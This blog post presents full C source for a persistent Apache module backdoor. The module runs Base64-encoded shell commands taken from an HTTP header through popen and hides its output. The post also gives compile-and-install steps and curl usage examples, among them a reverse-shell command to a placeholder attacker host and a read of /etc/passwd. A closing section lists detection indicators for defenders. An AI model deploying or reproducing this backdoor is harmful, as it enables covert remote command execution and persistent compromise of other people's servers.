---
date: '2025-10-30T09:36:24+05:00'
draft: false
title: 'Persistent Backdoors via Apache Modules 🕷️'
tags: ['backdoor', 'apache', 'persistence', 'red-team']
---

> **DISCLAIMER:**
> This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.

## Intro

![Article](/apache-persistence-cover.png)

While studying APT and Red Team materials, I came across an excellent article from [CICADA8](https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9) about establishing persistence in infrastructure through IIS modules instead of classic webshells.

In the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?

I'm not the first to explore this vector. Researchers from [ESET documented this technique back in 2012](https://www.welivesecurity.com/2012/12/20/malicious-apache-module-a-clarification/), but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.

### Why Apache Modules Over Traditional Webshells?

The advantages of this approach compared to conventional webshells are compelling:

- **Process-level execution**: The module runs inside the web server process and doesn't reside in the public webroot, making it significantly harder to discover through simple file enumeration
- **URL-agnostic operation**: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation
- **Stealth**: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level, but its not absolutely stealthy. 
- **Persistence**: Survives webroot cleanups and application redeployments

This article explores these attack vectors for research purposes and does not encourage malicious activity. Let's dive into the technical implementation.

## Module Development

To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:

### Technical Requirements

1. **Base64 encoding**: Commands should be transmitted in Base64 format, and output should be returned encoded as well
2. **Global interception**: The module should intercept all requests to the web application without being tied to a specific URL endpoint
3. **Header-based communication**: The server receives commands via HTTP request headers and returns output to the client
4. **Minimal footprint**: Avoid obvious indicators of compromise in standard logs

### Implementation Overview

With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.

#### Core Imports

```c
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include "http_request.h"
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
```

These headers provide the necessary Apache API functions and standard C libraries for our module.

#### Base64 Decoder Implementation

The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:

```c
static unsigned char *b64decode(apr_pool_t *pool, const char *input, size_t *out_len) {
    size_t len = strlen(input);
    unsigned char *output = apr_pcalloc(pool, len);
    static const char b64_table[256] = {
        ['A']=0, ['B']=1, ['C']=2, ['D']=3, ['E']=4, ['F']=5, ['G']=6, ['H']=7,
        ['I']=8, ['J']=9, ['K']=10, ['L']=11, ['M']=12, ['N']=13, ['O']=14, ['P']=15,
        ['Q']=16, ['R']=17, ['S']=18, ['T']=19, ['U']=20, ['V']=21, ['W']=22, ['X']=23,
        ['Y']=24, ['Z']=25, ['a']=26, ['b']=27, ['c']=28, ['d']=29, ['e']=30, ['f']=31,
        ['g']=32, ['h']=33, ['i']=34, ['j']=35, ['k']=36, ['l']=37, ['m']=38, ['n']=39,
        ['o']=40, ['p']=41, ['q']=42, ['r']=43, ['s']=44, ['t']=45, ['u']=46, ['v']=47,
        ['w']=48, ['x']=49, ['y']=50, ['z']=51, ['0']=52, ['1']=53, ['2']=54, ['3']=55,
        ['4']=56, ['5']=57, ['6']=58, ['7']=59, ['8']=60, ['9']=61, ['+']=62, ['/']=63
    };

    size_t i = 0, j = 0;
    uint32_t buf = 0;
    int bits = 0;

    while (i < len) {
        char c = input[i++];
        if (c == '=' || c == '\0') break;
        if ((unsigned char)c > 127 || (b64_table[(unsigned char)c] == 0 && c != 'A'))
            continue;

        buf = (buf << 6) | b64_table[(unsigned char)c];
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            output[j++] = (buf >> bits) & 0xFF;
        }
    }

    if (out_len) *out_len = j;
    return output;
}
```

#### Base64 Encoder Implementation

The encoder converts command output back to Base64 for transmission to the attacker:

```c
static char *b64encode(apr_pool_t *pool, const unsigned char *input, size_t len) {
    static const char b64_chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t out_len = 4 * ((len + 2) / 3);
    char *output = apr_pcalloc(pool, out_len + 1);

    size_t i = 0, j = 0;
    while (i < len) {
        uint32_t octet_a = i < len ? input[i++] : 0;
        uint32_t octet_b = i < len ? input[i++] : 0;
        uint32_t octet_c = i < len ? input[i++] : 0;

        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        output[j++] = b64_chars[(triple >> 18) & 0x3F];
        output[j++] = b64_chars[(triple >> 12) & 0x3F];
        output[j++] = (i > len + 1) ? '=' : b64_chars[(triple >> 6) & 0x3F];
        output[j++] = (i > len) ? '=' : b64_chars[triple & 0x3F];
    }

    output[out_len] = '\0';
    return output;
}
```

#### Request Hook Handler

This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:

```c
static int admin_exec_hook(request_rec *r)
{
    // Skip subrequests
    if (r->main) return DECLINED;

    // Check for our trigger header
    const char *hdr_enc = apr_table_get(r->headers_in, "X-Request-ID");
    if (!hdr_enc) return DECLINED;

    // Decode the command
    size_t cmd_len;
    unsigned char *cmd = b64decode(r->pool, hdr_enc, &cmd_len);
    if (!cmd || cmd_len == 0) return DECLINED;

    ap_set_content_type(r, "text/plain");

    // Execute command via popen
    FILE *fp = popen((const char *)cmd, "r");
    if (!fp) {
        ap_rputs("failed\n", r);
        return OK;
    }

    // Capture command output
    char buffer[8192];
    size_t total_len = 0;
    size_t cap = 8192;
    unsigned char *output = apr_pcalloc(r->pool, cap);

    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t blen = strlen(buffer);
        if (total_len + blen >= cap) {
            cap *= 2;
            unsigned char *newbuf = apr_palloc(r->pool, cap);
            memcpy(newbuf, output, total_len);
            output = newbuf;
        }
        memcpy(output + total_len, buffer, blen);
        total_len += blen;
    }

    pclose(fp);

    // Encode and return output
    char *encoded = b64encode(r->pool, output, total_len);
    ap_rputs(encoded, r);

    return OK;
}
```

#### Module Registration

Finally, we register our hook with Apache:

```c
static void register_hooks(apr_pool_t *p)
{
    ap_hook_header_parser(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE);
}

module AP_MODULE_DECLARE_DATA admin_exec_module = {
    STANDARD20_MODULE_STUFF,
    NULL, NULL, NULL, NULL,
    NULL,
    register_hooks
};
```

I called this whole project MODPlant, and deployed it in Github, you may download it [here](https://github.com/s0ld13rr/MODPlant).

## Proof of Concept Exploitation

### Prerequisites Installation

First of all, install the Apache development tools required for module compilation:

```bash
sudo apt update
sudo apt install apache2-dev -y
```

This installs the `apxs` (Apache Extension Tool) utility, which is essential for building and installing Apache modules.

### Module Compilation and Installation

![MODPlant Install](/modplant_install.png)

Compile and install the module with a single command:

```bash
sudo apxs -i -a -c mod_shell.c
```

This command performs three critical operations:

1. **Compilation**: Converts our C source code into a `.so` (shared object) library
2. **Installation**: Copies the compiled module to Apache's module directory
3. **Configuration**: Automatically adds a `LoadModule` directive to Apache's configuration

### Service Restart

![Apache Service](/apache-service-check.png)

After executing the `apxs` command, Apache needs to be restarted to load the new module:

```bash
sudo systemctl restart apache2
```

Verify the service is running correctly:

```bash
sudo systemctl status apache2
```

### Testing the Backdoor

![PoC Execution](/modplant-poc-exec.png)

Now we can interact with our backdoor. Commands are sent Base64-encoded via the `X-Request-ID` HTTP header. The header name can be modified in `mod_shell.c` to avoid detection.

Example using curl:

```bash
# Encode command: echo "whoami" | base64
# Result: d2hvYW1p

curl -H "X-Request-ID: d2hvYW1p" http://target-server.com/
```

The server responds with Base64-encoded output: `d3d3LWRhdGE=`

### Decoding the Response

![Decode Command Output](/modplant-command-output.png)

Decode the server's response to view command output:

```bash
echo "d3d3LWRhdGE=" | base64 -d
# Output: www-data
```

This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:

- Obfuscates command content from casual log inspection
- Handles binary data and special characters safely
- Maintains compatibility with HTTP protocol requirements

### Advanced Usage Examples

**File enumeration:**
```bash
# Command: ls -la /etc/passwd
echo "bHMgLWxhIC9ldGMvcGFzc3dk" | base64
curl -H "X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk" http://target/
```
But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case `www-data` default user does not have those excessive privileges, but it is also the vector for backdooring the target server.

**Reverse shell establishment:**
```bash
# Command: bash -i >& /dev/tcp/attacker.com/4444 0>&1
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx" | base64
curl -H "X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx" http://target/
```

## Detection and Hunting Perspective

### Indicators of Attack (IOA)

Defenders should monitor for the following suspicious activities:

#### 1. Suspicious `apxs` Execution

The `apxs` tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:

```bash
# Detection via Sysmon or auditd
apxs -i -a -c *.c
```

**Detection logic:**
- Unusual parent processes spawning `apxs`
- `apxs` execution by non-administrative users
- Compilation of `.c` files in unexpected directories (e.g., `/tmp`, `/var/www`)

#### 2. Apache Service Restarts

Unexpected Apache service restarts, especially outside maintenance windows:

```bash
systemctl restart apache2
service apache2 restart
/etc/init.d/apache2 restart
```

**Monitoring points:**
- Correlate service restarts with user activity
- Alert on restarts without corresponding change tickets
- Track which user initiated the restart

#### 3. File System Artifacts

Monitor critical Apache directories for new or modified files:

**Module configuration:**
```bash
/etc/apache2/mods-available/*.load
/etc/apache2/mods-enabled/*.load
```

**Compiled modules:**
```bash
/usr/lib/apache2/modules/*.so
```

In my case there is Debian based distro, and in your environment the path's may differ.

**Detection strategy:**
- Baseline legitimate modules during system provisioning
- Alert on new `.so` files with recent creation timestamps
- Check module file signatures against known-good hashes
- Inspect `.load` files for suspicious module names

#### 4. Behavioral Anomalies

**Network indicators:**
- Unusual outbound connections from Apache process
- HTTP requests with suspicious custom headers (e.g., `X-Request-ID` with long Base64 strings)
- Consistent Base64-encoded responses in HTTP traffic

The NGFW and IDS logs may help for inspecting such activity in the network. 

## Conclusion

Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.

### Key Takeaways

**For Red Teams:**
- Apache modules provide excellent persistence in authorized assessments
- The technique demonstrates the importance of defense-in-depth
- Custom headers and Base64 encoding add layers of obfuscation
- Consider operational security: module names, header names, and compilation artifacts all create detection opportunities

**For Blue Teams:**
- Traditional webshell detection methods are insufficient against module-based backdoors
- File integrity monitoring and behavioral analysis are critical
- Baseline your environment to detect anomalous module installations
- Process execution monitoring can catch compilation activities
- Network traffic analysis can identify suspicious Base64-encoded communications

### Future Research Directions

This technique can be extended further:
- **Memory-only operation**: Loading modules without disk persistence
- **Encrypted communications**: Replacing Base64 with AES encryption
- **Polymorphic modules**: Generating unique module signatures per deployment
- **Multi-protocol support**: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2
- **Anti-forensics**: Implementing self-deletion and log manipulation capabilities

The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.

### References 

- [From HTTP to RCE. How to leave backdoor in IIS](https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9)
- [Backdoors in XAMP stack (part III): Apache Modules](https://www.tarlogic.com/blog/backdoors-modules-apache/)
- [Malicious Apache Module: a clarification](https://www.welivesecurity.com/2012/12/20/malicious-apache-module-a-clarification/)
- [Developing modules for the Apache HTTP Server 2.4](https://httpd.apache.org/docs/2.4/developer/modguide.html)
- [Backdoor for Apache HTTP Server](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)
- [Apache2 mod_backdoor](https://github.com/VladRico/apache2_BackdoorMod)